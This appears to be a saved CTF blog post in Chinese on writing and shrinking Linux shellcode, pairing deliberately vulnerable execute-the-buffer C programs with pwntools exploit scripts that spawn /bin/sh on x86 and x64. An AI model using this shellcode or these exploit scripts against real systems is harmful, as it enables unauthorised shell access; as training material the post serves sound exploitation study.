@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Shellcode Tricks | AssassinQ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="ctfpwn">
+  
+  
+  
+  
+  <meta name="description" content="The Splendid Shellcode.">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shellcode Tricks">
+<meta property="og:url" content="qianfei11.coding.me/2019/03/02/[TODO]Shellcode-Tricks/index.html">
+<meta property="og:site_name" content="AssassinQ">
+<meta property="og:description" content="The Splendid Shellcode.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-02-09T08:47:33.035Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Shellcode Tricks">
+<meta name="twitter:description" content="The Splendid Shellcode.">
+  
+    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <link rel="stylesheet" href="/css/fashion.css">
+  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+</html>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
+    <img id="originBg" width="100%" alt="Hike News" src>
+  </div>
+
+  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
+    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
+  </div>
+
+  <script>
+        var imgUrls = "css/images/pose01.jpg".split(",");
+        var random = Math.floor((Math.random() * imgUrls.length ));
+        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
+          document.getElementById("originBg").src=imgUrls[random];
+          document.getElementById("blurBg").src=imgUrls[random];
+        } else {
+          document.getElementById("originBg").src='/' + imgUrls[random];
+          document.getElementById("blurBg").src='/' + imgUrls[random];
+        }
+    </script>
+
+
+
+
+<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
+            
+          </h1>
+          
+          
+            <div class="site-description">ZJGSU-IS-17</div>
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-[TODO]Shellcode-Tricks" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      Shellcode Tricks
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/03/02/[TODO]Shellcode-Tricks/" class="article-date">
+	  <time datetime="2019-03-02T11:05:59.000Z" itemprop="datePublished">March 2, 2019</time>
+	</a>
+
+       
+      
+
+	  |
+	  939 words
+	  |
+	  4 minute(s) to read
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>The Splendid Shellcode.</p>
+<a id="more"></a>
+<p>Shellcode 是一串可以直接被执行的机器码，可以用来获得 Shell。NX（DEP）（No eXecute）即可写不可执行、可执行不可写。</p>
+<ul>
+<li>可以控制程序执行流，可以控制一定的 data；</li>
+<li>利用<code>mprotect()</code>或者<code>_dl_make_stack_executable()</code>改写某些区域的 porc 再执行。</li>
+</ul>
+<p>关于 System Call：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_execve( <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[] );</span><br></pre></td></tr></table></figure>
+<p>目标：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p>System Call x86：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">eax</th>
+<th style="text-align:center">ebx</th>
+<th style="text-align:center">ecx</th>
+<th style="text-align:center">edx</th>
+<th style="text-align:center">else</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0xb</td>
+<td style="text-align:center">addr of “/bin/sh”</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">int 0x80</td>
+</tr>
+</tbody>
+</table>
+<p>System Call x64：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">rax</th>
+<th style="text-align:center">rdi</th>
+<th style="text-align:center">rsi</th>
+<th style="text-align:center">rdx</th>
+<th style="text-align:center">else</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">59</td>
+<td style="text-align:center">addr of “/bin/sh”</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">syscall</td>
+</tr>
+</tbody>
+</table>
+<h1 id="Basic-Shellcode"><a href="#Basic-Shellcode" class="headerlink" title="Basic Shellcode"></a>Basic Shellcode</h1><p>最基础的 shellcode，对输入的长度没有做任何限制。</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>Source Code：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -m32 -z execstack -o main</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span> (*ptr)();</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"shellcode&gt;&gt;"</span>);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line">	ptr = buf;</span><br><span class="line">	ptr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>push 字符串<code>&quot;/bin/sh&quot;</code>，此时 esp 指向字符串，即直接把 esp 的值赋给 ebx 即可。<code>&quot;/bin/sh&quot;</code>的值可以在 gdb 调试中<code>searchmem /bin/sh</code>得到。Shellcode 的长度为 29。</p>
+<p>Exploit：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">sh = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov eax, 0xb</span></span><br><span class="line"><span class="string">	mov ecx, 0</span></span><br><span class="line"><span class="string">	mov edx, 0</span></span><br><span class="line"><span class="string">	push 0x68732f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	mov ebx, esp</span></span><br><span class="line"><span class="string">	int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">info(disasm(sh))</span><br><span class="line">info(len(sh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">'shellcode&gt;&gt;\n'</span>, sh.ljust(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="shellcode64"><a href="#shellcode64" class="headerlink" title="shellcode64"></a>shellcode64</h2><p>Source Code：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -z execstack -o main</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span> (*ptr)();</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"shellcode&gt;&gt;"</span>);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">	ptr = buf;</span><br><span class="line">	ptr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>64 位下不能直接 push 值，需要通过寄存器 push。Shellcode 的长度为 37</p>
+<p>Exploit：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">sh = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov rax, 59</span></span><br><span class="line"><span class="string">	mov rsi, 0</span></span><br><span class="line"><span class="string">	mov rdx, 0</span></span><br><span class="line"><span class="string">	mov rdi, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">	push rdi</span></span><br><span class="line"><span class="string">	mov rdi, rsp</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">info(disasm(sh))</span><br><span class="line">info(len(sh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">'shellcode&gt;&gt;\n'</span>, sh.ljust(<span class="number">0x40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Baby-Shellcode"><a href="#Baby-Shellcode" class="headerlink" title="Baby Shellcode"></a>Baby Shellcode</h1><p>对接受的字符串长度做了一点限制，需要通过一些 Tricks 来缩短 Shellcode 的长度。</p>
+<h2 id="shellcode-20"><a href="#shellcode-20" class="headerlink" title="shellcode_20"></a>shellcode_20</h2><p>Source Code：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -m32 -z execstack -o main</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span> (*ptr)();</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"shellcode&gt;&gt;"</span>);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">20</span>);</span><br><span class="line">	ptr = buf;</span><br><span class="line">	ptr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>32 位下，<code>mov ecx, 0</code>是 5 个字节，而<code>xor ecx, ecx</code>只有 2 个字节，两者同样是给寄存器清零，后者可以省去 3 个字节。<code>mov eax, 0xb</code>同样需要 5 个字节，而在 eax 为 0 的情况下，我们只需要<code>mov al, 0xb</code>，只需要 2 个字节。<code>mul ebx</code>需要 2 个字节，其作用是将 eax 中值与 ebx 相乘，所得结果高位存在 edx，低位存在 eax。在调试中我们发现 ebx 的值为零，此时使用乘法指令可以直接使 eax 和 edx 的值变为 0，可以直接对 al 赋值，同时不用再对 edx 清零。最终 Shellcode 的长度缩短为 20 字节。</p>
+<p>Exploit：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">sh = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mul ebx</span></span><br><span class="line"><span class="string">	mov al, 0xb</span></span><br><span class="line"><span class="string">	xor ecx, ecx</span></span><br><span class="line"><span class="string">	push 0x0068732f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	mov ebx, esp</span></span><br><span class="line"><span class="string">	int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">info(disasm(sh))</span><br><span class="line">info(len(sh))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">'shellcode&gt;&gt;\n'</span>, sh.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="shellcode64-22"><a href="#shellcode64-22" class="headerlink" title="shellcode64_22"></a>shellcode64_22</h2><p>Source Code：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc main.c -z execstack -o main</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span> (*ptr)();</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x40</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"shellcode&gt;&gt;"</span>);</span><br><span class="line">	read(<span class="number">0</span>, buf, <span class="number">22</span>);</span><br><span class="line">	ptr = buf;</span><br><span class="line">	ptr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试中可以发现 rax 和 rbx 的值为 0，我们可以把 7 个字节的<code>mov rax, 59</code>缩短为 2 个字节的<code>mov al, 59</code>。同时清零 rdx 和 rsi 的工作可以通过 xor 来缩短成 3 个字节。然而，通过观察发现，64 位下只能通过寄存器的 push 只需要 1 个字节。如果用 push 和 pop，即<code>push rbx ; pop rsi</code>只需要 2 个字节。后面对 rdi 的赋值也可以通过同样的方式达到目的。最终 Shellcode 的长度缩短为 21 字节。</p>
+<p>Exploit：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">sh = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov al, 59</span></span><br><span class="line"><span class="string">	push rbx</span></span><br><span class="line"><span class="string">	push rbx</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	mov rdi, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">	push rdi</span></span><br><span class="line"><span class="string">	push rsp</span></span><br><span class="line"><span class="string">	pop rdi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">info(disasm(sh))</span><br><span class="line">info(len(sh))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">'shellcode&gt;&gt;\n'</span>, sh.ljust(<span class="number">0x40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Child-Shellcode"><a href="#Child-Shellcode" class="headerlink" title="Child Shellcode"></a>Child Shellcode</h1><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>TODO:</p>
+<h2 id="Death-Note"><a href="#Death-Note" class="headerlink" title="Death Note"></a>Death Note</h2><p>TODO:</p>
+<h1 id="Adult-Shellcode"><a href="#Adult-Shellcode" class="headerlink" title="Adult Shellcode"></a>Adult Shellcode</h1><h2 id="Alive-Note"><a href="#Alive-Note" class="headerlink" title="Alive Note"></a>Alive Note</h2><p>TODO:</p>
+<h1 id="Hell-Shellcode"><a href="#Hell-Shellcode" class="headerlink" title="Hell Shellcode"></a>Hell Shellcode</h1><h2 id="MnO2"><a href="#MnO2" class="headerlink" title="MnO2"></a>MnO2</h2><p>TODO:</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/04/Ubuntu16-04下编译libc2-23/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Ubuntu16.04下编译libc2.23
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/02/28/【转】怎样写一个解释器/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">【转】怎样写一个解释器</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-Shellcode"><span class="nav-number">1.</span> <span class="nav-text">Basic Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">1.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode64"><span class="nav-number">1.2.</span> <span class="nav-text">shellcode64</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Baby-Shellcode"><span class="nav-number">2.</span> <span class="nav-text">Baby Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode-20"><span class="nav-number">2.1.</span> <span class="nav-text">shellcode_20</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode64-22"><span class="nav-number">2.2.</span> <span class="nav-text">shellcode64_22</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Child-Shellcode"><span class="nav-number">3.</span> <span class="nav-text">Child Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#orw"><span class="nav-number">3.1.</span> <span class="nav-text">orw</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Death-Note"><span class="nav-number">3.2.</span> <span class="nav-text">Death Note</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Adult-Shellcode"><span class="nav-number">4.</span> <span class="nav-text">Adult Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Alive-Note"><span class="nav-number">4.1.</span> <span class="nav-text">Alive Note</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hell-Shellcode"><span class="nav-number">5.</span> <span class="nav-text">Hell Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MnO2"><span class="nav-number">5.1.</span> <span class="nav-text">MnO2</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2020 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
